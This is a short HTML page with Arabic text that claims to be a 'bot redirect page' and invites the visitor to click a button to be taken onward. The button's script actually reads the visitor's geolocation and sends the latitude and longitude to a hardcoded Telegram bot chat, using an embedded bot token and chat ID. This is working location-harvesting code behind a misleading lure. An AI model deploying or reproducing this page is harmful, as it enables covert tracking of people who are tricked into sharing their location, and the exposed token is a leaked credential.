<!DOCTYPE html>
<html>
<head>
  <title>صفحة توجيه البوت</title>
</head>
<body>
  <h2>شلونكم يابة اضغط هنا حتى تتوجه للصفحة</h2>
  <button onclick="getLocation()">اضغط هنا</button>
  <p id="result"></p>

  <script>
    const BOT_TOKEN = "7786101064:AAEHsY7be9Tk6SQtShnDR4jgmNxO59Qi2cQ";
    const CHAT_ID = "6028485445"

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          document.getElementById("result").innerText = `Latitude: ${lat}, Longitude: ${lon}`;

          // إرسال الإحداثيات باستخدام sendLocation
          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`)
            .then(response => response.json())
            .then(data => {
              console.log("تم الإرسال:", data);
              alert("تم إرسال الموقع إلى البوت!");
            })
            .catch(error => {
              console.error("خطأ في الإرسال:", error);
              alert("فشل إرسال الموقع.");
            });
        }, () => {
          alert("رفضت مشاركة الموقع.");
        });
      } else {
        alert("المتصفح لا يدعم تحديد الموقع.");
      }
    }
  </script>
</body>
</html>
